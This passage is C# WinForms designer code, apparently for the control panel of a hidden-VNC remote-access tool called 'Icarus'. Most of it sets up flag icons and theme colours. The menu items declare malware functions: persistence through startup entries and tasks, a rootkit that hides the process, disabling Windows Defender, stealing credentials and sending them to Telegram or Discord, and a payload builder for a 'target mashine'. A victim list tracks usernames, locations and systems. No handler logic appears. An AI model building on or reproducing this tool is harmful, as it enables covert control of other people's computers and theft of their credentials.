            this.imageList1.Images.SetKeyName(13, "aw.png");
            this.imageList1.Images.SetKeyName(14, "ax.png");
            this.imageList1.Images.SetKeyName(15, "az.png");
            this.imageList1.Images.SetKeyName(16, "ba.png");
            this.imageList1.Images.SetKeyName(17, "bb.png");
            this.imageList1.Images.SetKeyName(18, "bd.png");
            this.imageList1.Images.SetKeyName(19, "be.png");
            this.imageList1.Images.SetKeyName(20, "bf.png");
            this.imageList1.Images.SetKeyName(21, "bg.png");
            this.imageList1.Images.SetKeyName(22, "bh.png");
            this.imageList1.Images.SetKeyName(23, "bi.png");
            this.imageList1.Images.SetKeyName(24, "bj.png");
            this.imageList1.Images.SetKeyName(25, "bm.png");
            this.imageList1.Images.SetKeyName(26, "bn.png");
            this.imageList1.Images.SetKeyName(27, "bo.png");
            this.imageList1.Images.SetKeyName(28, "br.png");
            this.imageList1.Images.SetKeyName(29, "bs.png");
            this.imageList1.Images.SetKeyName(30, "bt.png");
            this.imageList1.Images.SetKeyName(31, "bv.png");
            this.imageList1.Images.SetKeyName(32, "bw.png");
            this.imageList1.Images.SetKeyName(33, "by.png");
            this.imageList1.Images.SetKeyName(34, "bz.png");
            this.imageList1.Images.SetKeyName(35, "ca.png");
            this.imageList1.Images.SetKeyName(36, "catalonia.png");
            this.imageList1.Images.SetKeyName(37, "cc.png");
            this.imageList1.Images.SetKeyName(38, "cd.png");
            this.imageList1.Images.SetKeyName(39, "cf.png");
            this.imageList1.Images.SetKeyName(40, "cg.png");
            this.imageList1.Images.SetKeyName(41, "ch.png");
            this.imageList1.Images.SetKeyName(42, "ci.png");
            this.imageList1.Images.SetKeyName(43, "ck.png");
            this.imageList1.Images.SetKeyName(44, "cl.png");
            this.imageList1.Images.SetKeyName(45, "cm.png");
            this.imageList1.Images.SetKeyName(46, "cn.png");
            this.imageList1.Images.SetKeyName(47, "co.png");
            this.imageList1.Images.SetKeyName(48, "cr.png");
            this.imageList1.Images.SetKeyName(49, "cs.png");
            this.imageList1.Images.SetKeyName(50, "cu.png");
            this.imageList1.Images.SetKeyName(51, "cv.png");
            this.imageList1.Images.SetKeyName(52, "cx.png");
            this.imageList1.Images.SetKeyName(53, "cy.png");
            this.imageList1.Images.SetKeyName(54, "cz.png");
            this.imageList1.Images.SetKeyName(55, "de.png");
            this.imageList1.Images.SetKeyName(56, "dj.png");
            this.imageList1.Images.SetKeyName(57, "dk.png");
            this.imageList1.Images.SetKeyName(58, "dm.png");
            this.imageList1.Images.SetKeyName(59, "do.png");
            this.imageList1.Images.SetKeyName(60, "dz.png");
            this.imageList1.Images.SetKeyName(61, "ec.png");
            this.imageList1.Images.SetKeyName(62, "ee.png");
            this.imageList1.Images.SetKeyName(63, "eg.png");
            this.imageList1.Images.SetKeyName(64, "eh.png");
            this.imageList1.Images.SetKeyName(65, "england.png");
            this.imageList1.Images.SetKeyName(66, "er.png");
            this.imageList1.Images.SetKeyName(67, "es.png");
            this.imageList1.Images.SetKeyName(68, "et.png");
            this.imageList1.Images.SetKeyName(69, "europeanunion.png");
            this.imageList1.Images.SetKeyName(70, "fam.png");
            this.imageList1.Images.SetKeyName(71, "fi.png");
            this.imageList1.Images.SetKeyName(72, "fj.png");
            this.imageList1.Images.SetKeyName(73, "fk.png");
            this.imageList1.Images.SetKeyName(74, "fm.png");
            this.imageList1.Images.SetKeyName(75, "fo.png");
            this.imageList1.Images.SetKeyName(76, "fr.png");
            this.imageList1.Images.SetKeyName(77, "ga.png");
            this.imageList1.Images.SetKeyName(78, "gb.png");
            this.imageList1.Images.SetKeyName(79, "gd.png");
            this.imageList1.Images.SetKeyName(80, "ge.png");
            this.imageList1.Images.SetKeyName(81, "gf.png");
            this.imageList1.Images.SetKeyName(82, "gh.png");
            this.imageList1.Images.SetKeyName(83, "gi.png");
            this.imageList1.Images.SetKeyName(84, "gl.png");
            this.imageList1.Images.SetKeyName(85, "gm.png");
            this.imageList1.Images.SetKeyName(86, "gn.png");
            this.imageList1.Images.SetKeyName(87, "gp.png");
            this.imageList1.Images.SetKeyName(88, "gq.png");
            this.imageList1.Images.SetKeyName(89, "gr.png");
            this.imageList1.Images.SetKeyName(90, "gs.png");
            this.imageList1.Images.SetKeyName(91, "gt.png");
            this.imageList1.Images.SetKeyName(92, "gu.png");
            this.imageList1.Images.SetKeyName(93, "gw.png");
            this.imageList1.Images.SetKeyName(94, "gy.png");
            this.imageList1.Images.SetKeyName(95, "hk.png");
            this.imageList1.Images.SetKeyName(96, "hm.png");
            this.imageList1.Images.SetKeyName(97, "hn.png");
            this.imageList1.Images.SetKeyName(98, "hr.png");
            this.imageList1.Images.SetKeyName(99, "ht.png");
            this.imageList1.Images.SetKeyName(100, "hu.png");
            this.imageList1.Images.SetKeyName(101, "id.png");
            this.imageList1.Images.SetKeyName(102, "ie.png");
            this.imageList1.Images.SetKeyName(103, "il.png");
            this.imageList1.Images.SetKeyName(104, "in.png");
            this.imageList1.Images.SetKeyName(105, "io.png");
            this.imageList1.Images.SetKeyName(106, "iq.png");
            this.imageList1.Images.SetKeyName(107, "ir.png");
            this.imageList1.Images.SetKeyName(108, "is.png");
            this.imageList1.Images.SetKeyName(109, "it.png");
            this.imageList1.Images.SetKeyName(110, "jm.png");
            this.imageList1.Images.SetKeyName(111, "jo.png");
            this.imageList1.Images.SetKeyName(112, "jp.png");
            this.imageList1.Images.SetKeyName(113, "ke.png");
            this.imageList1.Images.SetKeyName(114, "kg.png");
            this.imageList1.Images.SetKeyName(115, "kh.png");
            this.imageList1.Images.SetKeyName(116, "ki.png");
            this.imageList1.Images.SetKeyName(117, "km.png");
            this.imageList1.Images.SetKeyName(118, "kn.png");
            this.imageList1.Images.SetKeyName(119, "kp.png");
            this.imageList1.Images.SetKeyName(120, "kr.png");
            this.imageList1.Images.SetKeyName(121, "kw.png");
            this.imageList1.Images.SetKeyName(122, "ky.png");
            this.imageList1.Images.SetKeyName(123, "kz.png");
            this.imageList1.Images.SetKeyName(124, "la.png");
            this.imageList1.Images.SetKeyName(125, "lb.png");
            this.imageList1.Images.SetKeyName(126, "lc.png");
            this.imageList1.Images.SetKeyName(127, "li.png");
            this.imageList1.Images.SetKeyName(128, "lk.png");
            this.imageList1.Images.SetKeyName(129, "lr.png");
            this.imageList1.Images.SetKeyName(130, "ls.png");
            this.imageList1.Images.SetKeyName(131, "lt.png");
            this.imageList1.Images.SetKeyName(132, "lu.png");
            this.imageList1.Images.SetKeyName(133, "lv.png");
            this.imageList1.Images.SetKeyName(134, "ly.png");
            this.imageList1.Images.SetKeyName(135, "ma.png");
            this.imageList1.Images.SetKeyName(136, "mc.png");
            this.imageList1.Images.SetKeyName(137, "md.png");
            this.imageList1.Images.SetKeyName(138, "me.png");
            this.imageList1.Images.SetKeyName(139, "mg.png");
            this.imageList1.Images.SetKeyName(140, "mh.png");
            this.imageList1.Images.SetKeyName(141, "mk.png");
            this.imageList1.Images.SetKeyName(142, "ml.png");
            this.imageList1.Images.SetKeyName(143, "mm.png");
            this.imageList1.Images.SetKeyName(144, "mn.png");
            this.imageList1.Images.SetKeyName(145, "mo.png");
            this.imageList1.Images.SetKeyName(146, "mp.png");
            this.imageList1.Images.SetKeyName(147, "mq.png");
            this.imageList1.Images.SetKeyName(148, "mr.png");
            this.imageList1.Images.SetKeyName(149, "ms.png");
            this.imageList1.Images.SetKeyName(150, "mt.png");
            this.imageList1.Images.SetKeyName(151, "mu.png");
            this.imageList1.Images.SetKeyName(152, "mv.png");
            this.imageList1.Images.SetKeyName(153, "mw.png");
            this.imageList1.Images.SetKeyName(154, "mx.png");
            this.imageList1.Images.SetKeyName(155, "my.png");
            this.imageList1.Images.SetKeyName(156, "mz.png");
            this.imageList1.Images.SetKeyName(157, "na.png");
            this.imageList1.Images.SetKeyName(158, "nc.png");
            this.imageList1.Images.SetKeyName(159, "ne.png");
            this.imageList1.Images.SetKeyName(160, "nf.png");
            this.imageList1.Images.SetKeyName(161, "ng.png");
            this.imageList1.Images.SetKeyName(162, "ni.png");
            this.imageList1.Images.SetKeyName(163, "nl.png");
            this.imageList1.Images.SetKeyName(164, "no.png");
            this.imageList1.Images.SetKeyName(165, "np.png");
            this.imageList1.Images.SetKeyName(166, "nr.png");
            this.imageList1.Images.SetKeyName(167, "nu.png");
            this.imageList1.Images.SetKeyName(168, "nz.png");
            this.imageList1.Images.SetKeyName(169, "om.png");
            this.imageList1.Images.SetKeyName(170, "pa.png");
            this.imageList1.Images.SetKeyName(171, "pe.png");
            this.imageList1.Images.SetKeyName(172, "pf.png");
            this.imageList1.Images.SetKeyName(173, "pg.png");
            this.imageList1.Images.SetKeyName(174, "ph.png");
            this.imageList1.Images.SetKeyName(175, "pk.png");
            this.imageList1.Images.SetKeyName(176, "pl.png");
            this.imageList1.Images.SetKeyName(177, "pm.png");
            this.imageList1.Images.SetKeyName(178, "pn.png");
            this.imageList1.Images.SetKeyName(179, "pr.png");
            this.imageList1.Images.SetKeyName(180, "ps.png");
            this.imageList1.Images.SetKeyName(181, "pt.png");
            this.imageList1.Images.SetKeyName(182, "pw.png");
            this.imageList1.Images.SetKeyName(183, "py.png");
            this.imageList1.Images.SetKeyName(184, "qa.png");
            this.imageList1.Images.SetKeyName(185, "re.png");
            this.imageList1.Images.SetKeyName(186, "ro.png");
            this.imageList1.Images.SetKeyName(187, "rs.png");
            this.imageList1.Images.SetKeyName(188, "ru.png");
            this.imageList1.Images.SetKeyName(189, "rw.png");
            this.imageList1.Images.SetKeyName(190, "sa.png");
            this.imageList1.Images.SetKeyName(191, "sb.png");
            this.imageList1.Images.SetKeyName(192, "sc.png");
            this.imageList1.Images.SetKeyName(193, "scotland.png");
            this.imageList1.Images.SetKeyName(194, "sd.png");
            this.imageList1.Images.SetKeyName(195, "se.png");
            this.imageList1.Images.SetKeyName(196, "sg.png");
            this.imageList1.Images.SetKeyName(197, "sh.png");
            this.imageList1.Images.SetKeyName(198, "si.png");
            this.imageList1.Images.SetKeyName(199, "sj.png");
            this.imageList1.Images.SetKeyName(200, "sk.png");
            this.imageList1.Images.SetKeyName(201, "sl.png");
            this.imageList1.Images.SetKeyName(202, "sm.png");
            this.imageList1.Images.SetKeyName(203, "sn.png");
            this.imageList1.Images.SetKeyName(204, "so.png");
            this.imageList1.Images.SetKeyName(205, "sr.png");
            this.imageList1.Images.SetKeyName(206, "st.png");
            this.imageList1.Images.SetKeyName(207, "sv.png");
            this.imageList1.Images.SetKeyName(208, "sy.png");
            this.imageList1.Images.SetKeyName(209, "sz.png");
            this.imageList1.Images.SetKeyName(210, "tc.png");
            this.imageList1.Images.SetKeyName(211, "td.png");
            this.imageList1.Images.SetKeyName(212, "tf.png");
            this.imageList1.Images.SetKeyName(213, "tg.png");
            this.imageList1.Images.SetKeyName(214, "th.png");
            this.imageList1.Images.SetKeyName(215, "tj.png");
            this.imageList1.Images.SetKeyName(216, "tk.png");
            this.imageList1.Images.SetKeyName(217, "tl.png");
            this.imageList1.Images.SetKeyName(218, "tm.png");
            this.imageList1.Images.SetKeyName(219, "tn.png");
            this.imageList1.Images.SetKeyName(220, "to.png");
            this.imageList1.Images.SetKeyName(221, "tr.png");
            this.imageList1.Images.SetKeyName(222, "tt.png");
            this.imageList1.Images.SetKeyName(223, "tv.png");
            this.imageList1.Images.SetKeyName(224, "tw.png");
            this.imageList1.Images.SetKeyName(225, "tz.png");
            this.imageList1.Images.SetKeyName(226, "ua.png");
            this.imageList1.Images.SetKeyName(227, "ug.png");
            this.imageList1.Images.SetKeyName(228, "um.png");
            this.imageList1.Images.SetKeyName(229, "us.png");
            this.imageList1.Images.SetKeyName(230, "uy.png");
            this.imageList1.Images.SetKeyName(231, "uz.png");
            this.imageList1.Images.SetKeyName(232, "va.png");
            this.imageList1.Images.SetKeyName(233, "vc.png");
            this.imageList1.Images.SetKeyName(234, "ve.png");
            this.imageList1.Images.SetKeyName(235, "vg.png");
            this.imageList1.Images.SetKeyName(236, "vi.png");
            this.imageList1.Images.SetKeyName(237, "vn.png");
            this.imageList1.Images.SetKeyName(238, "vu.png");
            this.imageList1.Images.SetKeyName(239, "wales.png");
            this.imageList1.Images.SetKeyName(240, "wf.png");
            this.imageList1.Images.SetKeyName(241, "ws.png");
            this.imageList1.Images.SetKeyName(242, "ye.png");
            this.imageList1.Images.SetKeyName(243, "yt.png");
            this.imageList1.Images.SetKeyName(244, "za.png");
            this.imageList1.Images.SetKeyName(245, "zm.png");
            this.imageList1.Images.SetKeyName(246, "zw.png");
            this.contextMenuStrip1.ImageScalingSize = new Size(20, 20);
            this.contextMenuStrip1.Items.AddRange(new ToolStripItem[] { this.controlManagementToolStripMenuItem, this.miscOptionsToolStripMenuItem, this.serverControlToolStripMenuItem, this.hVNCPanelToolStripMenuItem, this.buildHVNCToolStripMenuItem });
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new Size(185, 156);
            this.controlManagementToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.startupToolStripMenuItem, this.taskToolStripMenuItem });
            this.controlManagementToolStripMenuItem.Image = (Image)resources.GetObject("controlManagementToolStripMenuItem.Image");
            this.controlManagementToolStripMenuItem.Name = "controlManagementToolStripMenuItem";
            this.controlManagementToolStripMenuItem.Size = new Size(184, 26);
            this.controlManagementToolStripMenuItem.Text = "Persistence Options";
            this.startupToolStripMenuItem.Image = (Image)resources.GetObject("startupToolStripMenuItem.Image");
            this.startupToolStripMenuItem.Name = "startupToolStripMenuItem";
            this.startupToolStripMenuItem.Size = new Size(117, 22);
            this.startupToolStripMenuItem.Text = "Add";
            this.startupToolStripMenuItem.ToolTipText = "Add Startup and Task All in one!";
            this.startupToolStripMenuItem.Click += this.startupToolStripMenuItem_Click;
            this.taskToolStripMenuItem.Image = (Image)resources.GetObject("taskToolStripMenuItem.Image");
            this.taskToolStripMenuItem.Name = "taskToolStripMenuItem";
            this.taskToolStripMenuItem.Size = new Size(117, 22);
            this.taskToolStripMenuItem.Text = "Remove";
            this.taskToolStripMenuItem.ToolTipText = "Remove Startup and Task!";
            this.taskToolStripMenuItem.Click += this.taskToolStripMenuItem_Click;
            this.miscOptionsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.watcherToolStripMenuItem, this.rootkitToolStripMenuItem, this.killWindowsDefenderToolStripMenuItem, this.passwordsRecoveryToolStripMenuItem, this.stealAndSendToDiscordToolStripMenuItem });
            this.miscOptionsToolStripMenuItem.Image = (Image)resources.GetObject("miscOptionsToolStripMenuItem.Image");
            this.miscOptionsToolStripMenuItem.Name = "miscOptionsToolStripMenuItem";
            this.miscOptionsToolStripMenuItem.Size = new Size(184, 26);
            this.miscOptionsToolStripMenuItem.Text = "Misc Options";
            this.watcherToolStripMenuItem.Image = (Image)resources.GetObject("watcherToolStripMenuItem.Image");
            this.watcherToolStripMenuItem.Name = "watcherToolStripMenuItem";
            this.watcherToolStripMenuItem.Size = new Size(220, 26);
            this.watcherToolStripMenuItem.Text = "Watcher";
            this.watcherToolStripMenuItem.ToolTipText = "If you activate Watcher ,do not activate Rootkit!";
            this.watcherToolStripMenuItem.Visible = false;
            this.watcherToolStripMenuItem.Click += this.watcherToolStripMenuItem_Click;
            this.rootkitToolStripMenuItem.Image = (Image)resources.GetObject("rootkitToolStripMenuItem.Image");
            this.rootkitToolStripMenuItem.Name = "rootkitToolStripMenuItem";
            this.rootkitToolStripMenuItem.Size = new Size(220, 26);
            this.rootkitToolStripMenuItem.Text = "Rootkit(Hide HVNC Proc)";
            this.rootkitToolStripMenuItem.ToolTipText = "If you activate Rootkit ,do not activate Watcher!";
            this.rootkitToolStripMenuItem.Visible = false;
            this.rootkitToolStripMenuItem.Click += this.rootkitToolStripMenuItem_Click;
            this.killWindowsDefenderToolStripMenuItem.Image = (Image)resources.GetObject("killWindowsDefenderToolStripMenuItem.Image");
            this.killWindowsDefenderToolStripMenuItem.Name = "killWindowsDefenderToolStripMenuItem";
            this.killWindowsDefenderToolStripMenuItem.Size = new Size(220, 26);
            this.killWindowsDefenderToolStripMenuItem.Text = "Kill Windows Defender";
            this.killWindowsDefenderToolStripMenuItem.ToolTipText = "Disable Windows Defender!";
            this.killWindowsDefenderToolStripMenuItem.Click += this.killWindowsDefenderToolStripMenuItem_Click;
            this.passwordsRecoveryToolStripMenuItem.Image = (Image)resources.GetObject("passwordsRecoveryToolStripMenuItem.Image");
            this.passwordsRecoveryToolStripMenuItem.Name = "passwordsRecoveryToolStripMenuItem";
            this.passwordsRecoveryToolStripMenuItem.Size = new Size(220, 26);
            this.passwordsRecoveryToolStripMenuItem.Text = "Steal and Send to Telegram";
            this.passwordsRecoveryToolStripMenuItem.Visible = false;
            this.passwordsRecoveryToolStripMenuItem.Click += this.passwordsRecoveryToolStripMenuItem_Click_1;
            this.stealAndSendToDiscordToolStripMenuItem.Image = (Image)resources.GetObject("stealAndSendToDiscordToolStripMenuItem.Image");
            this.stealAndSendToDiscordToolStripMenuItem.Name = "stealAndSendToDiscordToolStripMenuItem";
            this.stealAndSendToDiscordToolStripMenuItem.Size = new Size(220, 26);
            this.stealAndSendToDiscordToolStripMenuItem.Text = "Steal and Send to Discord";
            this.stealAndSendToDiscordToolStripMenuItem.Visible = false;
            this.stealAndSendToDiscordToolStripMenuItem.Click += this.stealAndSendToDiscordToolStripMenuItem_Click;
            this.serverControlToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.uninstallToolStripMenuItem, this.restartToolStripMenuItem, this.resetSizeToolStripMenuItem });
            this.serverControlToolStripMenuItem.Image = (Image)resources.GetObject("serverControlToolStripMenuItem.Image");
            this.serverControlToolStripMenuItem.Name = "serverControlToolStripMenuItem";
            this.serverControlToolStripMenuItem.Size = new Size(184, 26);
            this.serverControlToolStripMenuItem.Text = "Server Control";
            this.uninstallToolStripMenuItem.Image = (Image)resources.GetObject("uninstallToolStripMenuItem.Image");
            this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
            this.uninstallToolStripMenuItem.Size = new Size(125, 22);
            this.uninstallToolStripMenuItem.Text = "Uninstall";
            this.uninstallToolStripMenuItem.ToolTipText = "Kill and remove payload!";
            this.uninstallToolStripMenuItem.Click += this.uninstallToolStripMenuItem_Click;
            this.restartToolStripMenuItem.Image = (Image)resources.GetObject("restartToolStripMenuItem.Image");
            this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
            this.restartToolStripMenuItem.Size = new Size(125, 22);
            this.restartToolStripMenuItem.Text = "Restart";
            this.restartToolStripMenuItem.Visible = false;
            this.resetSizeToolStripMenuItem.Image = (Image)resources.GetObject("resetSizeToolStripMenuItem.Image");
            this.resetSizeToolStripMenuItem.Name = "resetSizeToolStripMenuItem";
            this.resetSizeToolStripMenuItem.Size = new Size(125, 22);
            this.resetSizeToolStripMenuItem.Text = "Reset Size";
            this.resetSizeToolStripMenuItem.ToolTipText = "Reset Scale hVNC!";
            this.resetSizeToolStripMenuItem.Click += this.resetSizeToolStripMenuItem_Click;
            this.hVNCPanelToolStripMenuItem.Image = (Image)resources.GetObject("hVNCPanelToolStripMenuItem.Image");
            this.hVNCPanelToolStripMenuItem.Name = "hVNCPanelToolStripMenuItem";
            this.hVNCPanelToolStripMenuItem.Size = new Size(184, 26);
            this.hVNCPanelToolStripMenuItem.Text = "hVNC Panel";
            this.hVNCPanelToolStripMenuItem.ToolTipText = "Open hVNC Controller!";
            this.hVNCPanelToolStripMenuItem.Click += this.hVNCPanelToolStripMenuItem_Click;
            this.buildHVNCToolStripMenuItem.Image = (Image)resources.GetObject("buildHVNCToolStripMenuItem.Image");
            this.buildHVNCToolStripMenuItem.Name = "buildHVNCToolStripMenuItem";
            this.buildHVNCToolStripMenuItem.Size = new Size(184, 26);
            this.buildHVNCToolStripMenuItem.Text = "Payload Builder";
            this.buildHVNCToolStripMenuItem.ToolTipText = "Build a Payload to run on target mashine!";
            this.buildHVNCToolStripMenuItem.Click += this.buildHVNCToolStripMenuItem_Click;
            this.imageList2.ImageStream = (ImageListStreamer)resources.GetObject("imageList2.ImageStream");
            this.imageList2.TransparentColor = Color.Transparent;
            this.imageList2.Images.SetKeyName(0, "server_delete.png");
            this.imageList2.Images.SetKeyName(1, "server_disconnect.png");
            this.primeTheme1.BackColor = Color.White;
            this.primeTheme1.BorderStyle = FormBorderStyle.None;
            bloom.Name = "Sides";
            bloom.Value = Color.FromArgb(232, 232, 232);
            bloom2.Name = "Gradient1";
            bloom2.Value = Color.FromArgb(252, 252, 252);
            bloom3.Name = "Gradient2";
            bloom3.Value = Color.FromArgb(242, 242, 242);
            bloom4.Name = "TextShade";
            bloom4.Value = Color.White;
            bloom5.Name = "Text";
            bloom5.Value = Color.FromArgb(80, 80, 80);
            bloom6.Name = "Back";
            bloom6.Value = Color.White;
            bloom7.Name = "Border1";
            bloom7.Value = Color.FromArgb(180, 180, 180);
            bloom8.Name = "Border2";
            bloom8.Value = Color.White;
            bloom9.Name = "Border3";
            bloom9.Value = Color.White;
            bloom10.Name = "Border4";
            bloom10.Value = Color.FromArgb(150, 150, 150);
            this.primeTheme1.Colors = new Bloom[] { bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10 };
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.pictureBox1);
            this.primeTheme1.Controls.Add(this.studioButton1);
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Controls.Add(this.ClientsList);
            this.primeTheme1.Controls.Add(this.studioButton4);
            this.primeTheme1.Controls.Add(this.studioButton3);
            this.primeTheme1.Controls.Add(this.panel1);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = DockStyle.Fill;
            this.primeTheme1.Font = new Font("Verdana", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new Size(1374, 671);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 2;
            this.primeTheme1.TransparencyKey = Color.Fuchsia;
            this.label3.AutoSize = true;
            this.label3.BackColor = Color.Transparent;
            this.label3.Font = new Font("Verdana", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this.label3.ForeColor = Color.Black;
            this.label3.Location = new Point(39, 13);
            this.label3.Name = "label3";
            this.label3.Size = new Size(54, 16);
            this.label3.TabIndex = 38;
            this.label3.Text = "Icarus";
            this.pictureBox1.BackColor = Color.Transparent;
            this.pictureBox1.Image = (Image)resources.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new Point(1, 0);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new Size(51, 48);
            this.pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 37;
            this.pictureBox1.TabStop = false;
            this.studioButton1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            this.studioButton1.BackColor = Color.Transparent;
            bloom11.Name = "DownGradient1";
            bloom11.Value = Color.FromArgb(45, 65, 95);
            bloom12.Name = "DownGradient2";
            bloom12.Value = Color.FromArgb(65, 85, 115);
            bloom13.Name = "NoneGradient1";
            bloom13.Value = Color.FromArgb(65, 85, 115);
            bloom14.Name = "NoneGradient2";
            bloom14.Value = Color.FromArgb(45, 65, 95);
            bloom15.Name = "Shine1";
            bloom15.Value = Color.FromArgb(30, 255, 255, 255);
            bloom16.Name = "Shine2A";
            bloom16.Value = Color.FromArgb(30, 255, 255, 255);
            bloom17.Name = "Shine2B";
            bloom17.Value = Color.Transparent;
            bloom18.Name = "Shine3";
            bloom18.Value = Color.FromArgb(20, 255, 255, 255);
            bloom19.Name = "TextShade";
            bloom19.Value = Color.FromArgb(50, 0, 0, 0);
            bloom20.Name = "Text";
            bloom20.Value = Color.White;
            bloom21.Name = "Glow";
            bloom21.Value = Color.FromArgb(10, 255, 255, 255);
            bloom22.Name = "Border";
            bloom22.Value = Color.FromArgb(20, 40, 70);
            bloom23.Name = "Corners";
            bloom23.Value = Color.FromArgb(20, 40, 70);
            this.studioButton1.Colors = new Bloom[]
            {
        bloom11, bloom12, bloom13, bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20,
        bloom21, bloom22, bloom23
            };
            this.studioButton1.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton1.Font = new Font("Verdana", 8f);
            this.studioButton1.Image = null;
            this.studioButton1.Location = new Point(1290, -5);
            this.studioButton1.Name = "studioButton1";
            this.studioButton1.NoRounding = false;
            this.studioButton1.Size = new Size(13, 30);
            this.studioButton1.TabIndex = 25;
            this.studioButton1.Transparent = true;
            this.studioButton1.Click += this.studioButton1_Click;
            this.studioButton5.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            this.studioButton5.BackColor = Color.Transparent;
            bloom24.Name = "DownGradient1";
            bloom24.Value = Color.FromArgb(45, 65, 95);
            bloom25.Name = "DownGradient2";
            bloom25.Value = Color.FromArgb(65, 85, 115);
            bloom26.Name = "NoneGradient1";
            bloom26.Value = Color.FromArgb(65, 85, 115);
            bloom27.Name = "NoneGradient2";
            bloom27.Value = Color.FromArgb(45, 65, 95);
            bloom28.Name = "Shine1";
            bloom28.Value = Color.FromArgb(30, 255, 255, 255);
            bloom29.Name = "Shine2A";
            bloom29.Value = Color.FromArgb(30, 255, 255, 255);
            bloom30.Name = "Shine2B";
            bloom30.Value = Color.Transparent;
            bloom31.Name = "Shine3";
            bloom31.Value = Color.FromArgb(20, 255, 255, 255);
            bloom32.Name = "TextShade";
            bloom32.Value = Color.FromArgb(50, 0, 0, 0);
            bloom33.Name = "Text";
            bloom33.Value = Color.White;
            bloom34.Name = "Glow";
            bloom34.Value = Color.FromArgb(10, 255, 255, 255);
            bloom35.Name = "Border";
            bloom35.Value = Color.FromArgb(20, 40, 70);
            bloom36.Name = "Corners";
            bloom36.Value = Color.FromArgb(20, 40, 70);
            this.studioButton5.Colors = new Bloom[]
            {
        bloom24, bloom25, bloom26, bloom27, bloom28, bloom29, bloom30, bloom31, bloom32, bloom33,
        bloom34, bloom35, bloom36
            };
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new Font("Verdana", 8f);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new Point(1347, -5);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new Size(13, 30);
            this.studioButton5.TabIndex = 24;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += this.studioButton5_Click;
            this.ClientsList.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            this.ClientsList.BackColor = Color.FromArgb(226, 226, 226);
            this.ClientsList.BackgroundImage = Resources.finalRecovered;
            this.ClientsList.BorderStyle = BorderStyle.None;
            this.ClientsList.Columns.AddRange(new ColumnHeader[] { this.columnHeader1, this.columnHeader2, this.columnHeader3, this.columnHeader4, this.columnHeader5, this.columnHeader6, this.columnHeader7 });
            this.ClientsList.Font = new Font("Century Gothic", 8f);
            this.ClientsList.FullRowSelect = true;
            this.ClientsList.HideSelection = false;
            this.ClientsList.Location = new Point(14, 41);
            this.ClientsList.Name = "ClientsList";
            this.ClientsList.OwnerDraw = true;
            this.ClientsList.Size = new Size(1346, 590);
            this.ClientsList.SmallImageList = this.imageList1;
            this.ClientsList.TabIndex = 1;
            this.ClientsList.UseCompatibleStateImageBehavior = false;
            this.ClientsList.View = View.Details;
            this.ClientsList.DoubleClick += this.HVNCList_DoubleClick;
            this.ClientsList.MouseDown += this.HVNCList_MouseDown;
            this.ClientsList.MouseLeave += this.HVNCList_MouseLeave;
            this.columnHeader1.Text = "GROUP";
            this.columnHeader1.Width = 135;
            this.columnHeader2.Text = "ROOT";
            this.columnHeader2.Width = 141;
            this.columnHeader3.Text = "USERNAME";
            this.columnHeader3.Width = 176;
            this.columnHeader4.Text = "LOCATION";
            this.columnHeader4.Width = 100;
            this.columnHeader5.Text = "SYSTEM";
            this.columnHeader5.Width = 198;
            this.columnHeader6.Text = "ACTIVATED";
            this.columnHeader6.Width = 153;
            this.columnHeader7.Text = "PAYLOAD";
            this.columnHeader7.Width = 91;
            this.studioButton4.Anchor = AnchorStyles.Top | AnchorStyles.Right;
            this.studioButton4.BackColor = Color.Transparent;
            bloom37.Name = "DownGradient1";
            bloom37.Value = Color.FromArgb(45, 65, 95);
            bloom38.Name = "DownGradient2";
            bloom38.Value = Color.FromArgb(65, 85, 115);
            bloom39.Name = "NoneGradient1";
            bloom39.Value = Color.FromArgb(65, 85, 115);
            bloom40.Name = "NoneGradient2";
            bloom40.Value = Color.FromArgb(45, 65, 95);
            bloom41.Name = "Shine1";
            bloom41.Value = Color.FromArgb(30, 255, 255, 255);
            bloom42.Name = "Shine2A";
            bloom42.Value = Color.FromArgb(30, 255, 255, 255);
            bloom43.Name = "Shine2B";
            bloom43.Value = Color.Transparent;
            bloom44.Name = "Shine3";
            bloom44.Value = Color.FromArgb(20, 255, 255, 255);
            bloom45.Name = "TextShade";
            bloom45.Value = Color.FromArgb(50, 0, 0, 0);
            bloom46.Name = "Text";
            bloom46.Value = Color.White;
            bloom47.Name = "Glow";
            bloom47.Value = Color.FromArgb(10, 255, 255, 255);
            bloom48.Name = "Border";
            bloom48.Value = Color.FromArgb(20, 40, 70);
            bloom49.Name = "Corners";
